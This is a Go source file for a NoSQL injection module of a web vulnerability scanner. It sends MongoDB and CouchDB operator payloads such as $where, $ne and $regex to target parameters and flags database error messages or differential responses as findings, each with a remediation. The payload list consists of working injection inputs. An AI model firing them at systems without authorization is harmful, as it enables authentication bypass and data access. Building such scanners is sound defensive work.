package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
)

type NoSQLiModule struct{}

func NewNoSQLiModule() *NoSQLiModule {
	return &NoSQLiModule{}
}

func (m *NoSQLiModule) Name() string {
	return "nosqli"
}

func (m *NoSQLiModule) Description() string {
	return "NoSQL (MongoDB) Injection via query operator differential and error disclosure"
}

var (
	// Comprehensive NoSQL error signatures for MongoDB, CouchDB, DynamoDB, NeDB
	mongoErrorRegex = regexp.MustCompile(`(?i)(MongoError|MongoServerError|Can't canonicalize query|Cannot use '\$|unknown operator: \$|BSONObj size|Cast to ObjectId failed|syntax error near.*mongo|bad query: BadValue|Failed to parse: \$|CouchDB.*error|unknown query operator)`)

	/*
	CATEGORY: NoSQL Injection Probes (50+ entries)
	Sources: PayloadsAllTheThings NoSQLi, OWASP Testing Guide, HackTricks NoSQL.
	Contexts:
	- Evaluation operators ($where, $regex, $expr)
	- Comparison operators ($ne, $gt, $gte, $lt, $lte, $in, $nin)
	- Element & Logical operators ($exists, $type, $or, $and, $not)
	- Form query selector parameters ([$ne], [$gt], [$regex])
	- JSON object payloads
	*/
	noSQLiErrorProbes = []string{
		// 1. MongoDB $where Evaluation
		`{"$where": "this"}`,
		`{"$where": "1 == 1"}`,
		`{"$where": "this.password.match(/.*/)"}`,
		`{"$where": "sleep(1)"}`,
		`';return true;var foo='`,
		`";return true;var foo="`,
		`1;return true`,

		// 2. MongoDB Comparison Operators
		`{"$ne": null}`,
		`{"$ne": 0}`,
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`{"$gt": 0}`,
		`{"$gte": ""}`,
		`{"$lt": "zzzz"}`,
		`{"$lte": "zzzz"}`,
		`{"$in": [1, 2, 3]}`,
		`{"$nin": [999999]}`,

		// 3. MongoDB Element & Type Operators
		`{"$exists": true}`,
		`{"$exists": false}`,
		`{"$type": 2}`,
		`{"$type": "string"}`,

		// 4. MongoDB Regex Operators
		`{"$regex": ".*"}`,
		`{"$regex": "^[a-zA-Z0-9]"}`,
		`{"$regex": "^a"}`,

		// 5. Malformed Operator Probes (Triggering Engine Exceptions)
		`{"$invalid_operator": 1}`,
		`{"$bad_op": "test"}`,
		`{"$expr": {"$eq": [1, 1]}}`,
		`{"$expr": {"$gt": [2, 1]}}`,
		`{"$jsonSchema": {}}`,
		`{"$mod": [2, 0]}`,
		`{"$size": 1}`,
		`{"$all": [1]}`,
		`{"$elemMatch": {"$gt": 0}}`,
		`{"$slice": 1}`,

		// 6. CouchDB & Alternative NoSQL
		`{"_id": {"$gt": null}}`,
		`{"selector": {"_id": {"$gt": null}}}`,
	}
)

func (m *NoSQLiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	headers := map[string]string{}
	if target.IsJSON {
		headers["Content-Type"] = "application/json"
	}

	for _, param := range target.Parameters() {
		// 1. Error-based probes
		for _, probe := range noSQLiErrorProbes {
			var errResp *client.Response
			var err error
			if isPost {
				errResp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, probe), headers)
			} else {
				errResp, err = c.Request("GET", target.BuildURLWithParam(param, probe), "", nil)
			}

			if err == nil && errResp != nil && mongoErrorRegex.MatchString(errResp.Body) {
				evidence := mongoErrorRegex.FindString(errResp.Body)
				f := &Finding{
					Module:      m.Name(),
					Title:       "Error-Based NoSQL (MongoDB) Injection",
					Severity:    SeverityHigh,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe,
					Detail:      fmt.Sprintf("Disclosed database engine error via injected NoSQL operator: '%s'", evidence),
					Evidence:    evidence,
					Remediation: "Sanitize user input and prevent passing raw objects into NoSQL query constructors.",
					CWEID:       943,
				}
				f.SetConfidence(ConfidenceConfirmed)
				findings = append(findings, f)
				break
			}
		}

		// 2. Differential probe: True vs False condition ($ne vs $eq)
		if target.IsJSON {
			trueJSONPayload := `{"$ne": "nflx_nonexistent_9999"}`
			falseJSONPayload := `{"$eq": "nflx_nonexistent_9999"}`

			trueResp, _ := c.Request("POST", target.URL, target.BuildBodyWithParam(param, trueJSONPayload), headers)
			falseResp, _ := c.Request("POST", target.URL, target.BuildBodyWithParam(param, falseJSONPayload), headers)

			if trueResp != nil && falseResp != nil {
				if trueResp.StatusCode == 200 && (falseResp.StatusCode != 200 || Similarity(trueResp.Body, falseResp.Body) < 0.60) {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Differential Boolean NoSQL (MongoDB) Injection in JSON",
						Severity:    SeverityHigh,
						URL:         target.URL,
						Parameter:   param,
						Payload:     trueJSONPayload,
						Detail:      fmt.Sprintf("JSON parameter '%s' evaluated MongoDB $ne operator differentially (True: %d, False: %d).", param, trueResp.StatusCode, falseResp.StatusCode),
						Evidence:    fmt.Sprintf("True status: %d (bytes: %d) vs False status: %d (bytes: %d)", trueResp.StatusCode, trueResp.Bytes, falseResp.StatusCode, falseResp.Bytes),
						Remediation: "Validate JSON leaves against strict primitive schemas.",
						CWEID:       943,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					continue
				}
			}
		} else {
			trueParam := fmt.Sprintf("%s[$ne]", param)
			falseParam := fmt.Sprintf("%s[$eq]", param)

			var trueResp, falseResp *client.Response
			if isPost {
				trueResp, _ = c.Request("POST", target.URL, target.BuildDataWithParam(trueParam, "nflx_nonexistent_9999"), nil)
				falseResp, _ = c.Request("POST", target.URL, target.BuildDataWithParam(falseParam, "nflx_nonexistent_9999"), nil)
			} else {
				trueResp, _ = c.Request("GET", target.BuildURLWithParam(trueParam, "nflx_nonexistent_9999"), "", nil)
				falseResp, _ = c.Request("GET", target.BuildURLWithParam(falseParam, "nflx_nonexistent_9999"), "", nil)
			}

			if trueResp != nil && falseResp != nil {
				if trueResp.StatusCode == 200 && (falseResp.StatusCode != 200 || Similarity(trueResp.Body, falseResp.Body) < 0.60) {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Differential Boolean NoSQL (MongoDB) Injection",
						Severity:    SeverityHigh,
						URL:         target.URL,
						Parameter:   param,
						Payload:     fmt.Sprintf("%s[$ne]=nflx_nonexistent_9999", param),
						Detail:      fmt.Sprintf("Parameter '%s' evaluated injected NoSQL operator '$ne' differentially (True: %d, False: %d).", param, trueResp.StatusCode, falseResp.StatusCode),
						Evidence:    fmt.Sprintf("True status: %d (bytes: %d) vs False status: %d (bytes: %d)", trueResp.StatusCode, trueResp.Bytes, falseResp.StatusCode, falseResp.Bytes),
						Remediation: "Ensure input parameters are strictly validated as primitive strings rather than objects or query selector hashes.",
						CWEID:       943,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
				}
			}
		}
	}

	return findings, nil
}
